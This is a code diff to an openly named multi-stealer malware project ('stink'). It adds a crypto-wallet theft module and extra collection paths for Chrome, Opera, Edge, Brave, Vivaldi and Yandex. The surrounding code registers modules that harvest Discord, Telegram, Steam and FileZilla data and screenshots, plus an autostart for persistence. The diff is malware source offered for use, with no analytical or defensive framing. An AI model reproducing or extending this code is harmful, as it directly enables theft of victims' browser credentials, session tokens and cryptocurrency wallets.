@@ -8,7 +8,7 @@ from stink.enums import Features, Utils
 from stink.utils import Autostart, Message
 from stink.helpers import functions, MemoryStorage
 from stink.helpers.config import MultistealerConfig, Browsers
-from stink.modules import Chromium, Discord, FileZilla, Processes, Screenshot, System, Telegram, Steam
+from stink.modules import Chromium, Discord, FileZilla, Processes, Screenshot, System, Telegram, Steam, Wallets
 
 
 class Stealer(Thread):
@@ -54,6 +54,7 @@ class Stealer(Thread):
                     Browsers.CHROME.value,
                     self.__config.ChromePaths[0],
                     self.__config.ChromePaths[1],
+                    self.__config.ChromePaths[2],
                     browser_functions
                 ),
                 "status": browser_statuses
@@ -64,6 +65,7 @@ class Stealer(Thread):
                     Browsers.OPERA_GX.value,
                     self.__config.OperaGXPaths[0],
                     self.__config.OperaGXPaths[1],
+                    self.__config.OperaGXPaths[2],
                     browser_functions
                 ),
                 "status": browser_statuses
@@ -74,6 +76,7 @@ class Stealer(Thread):
                     Browsers.OPERA_DEFAULT.value,
                     self.__config.OperaDefaultPaths[0],
                     self.__config.OperaDefaultPaths[1],
+                    self.__config.OperaDefaultPaths[2],
                     browser_functions
                 ),
                 "status": browser_statuses
@@ -84,6 +87,7 @@ class Stealer(Thread):
                     Browsers.EDGE.value,
                     self.__config.MicrosoftEdgePaths[0],
                     self.__config.MicrosoftEdgePaths[1],
+                    self.__config.MicrosoftEdgePaths[2],
                     browser_functions
                 ),
                 "status": browser_statuses
@@ -94,6 +98,7 @@ class Stealer(Thread):
                     Browsers.BRAVE.value,
                     self.__config.BravePaths[0],
                     self.__config.BravePaths[1],
+                    self.__config.BravePaths[2],
                     browser_functions
                 ),
                 "status": browser_statuses
@@ -104,6 +109,7 @@ class Stealer(Thread):
                     Browsers.VIVALDI.value,
                     self.__config.VivaldiPaths[0],
                     self.__config.VivaldiPaths[1],
+                    self.__config.VivaldiPaths[2],
                     browser_functions
                 ),
                 "status": browser_statuses
@@ -114,6 +120,7 @@ class Stealer(Thread):
                     Browsers.YANDEX.value,
                     self.__config.YandexPaths[0],
                     self.__config.YandexPaths[1],
+                    self.__config.YandexPaths[2],
                     browser_functions
                 ),
                 "status": browser_statuses
@@ -166,6 +173,13 @@ class Stealer(Thread):
                     "Programs/Steam",
                 ),
                 "status": True if (Features.steam in features or Features.all in features) else False
+            },
+            {
+                "object": Wallets,
+                "arguments": (
+                    "Wallets",
+                ),
+                "status": True if (Features.wallets in features or Features.all in features) else False
             }
         ]
 
